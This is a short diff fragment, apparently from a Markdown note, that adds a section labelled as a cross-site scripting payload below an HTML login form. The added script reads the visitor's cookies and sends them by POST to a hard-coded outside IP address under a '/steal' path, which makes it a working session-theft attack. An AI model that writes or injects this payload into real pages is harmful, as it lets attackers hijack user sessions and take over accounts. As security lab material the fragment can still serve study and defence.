@@ -215,3 +215,16 @@ Password: <input type="password" name="password" size="20"/>
 </html>
 ```
 
+---
+
+Cross-site scripting (XSS) payload:
+
+```
+<script>
+var oReq = new XMLHttpRequest();
+oReq.open("POST", "http://18.234.145.155:10081/steal");
+oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+oReq.send("data="+document.cookie);
+</script>
+```
+
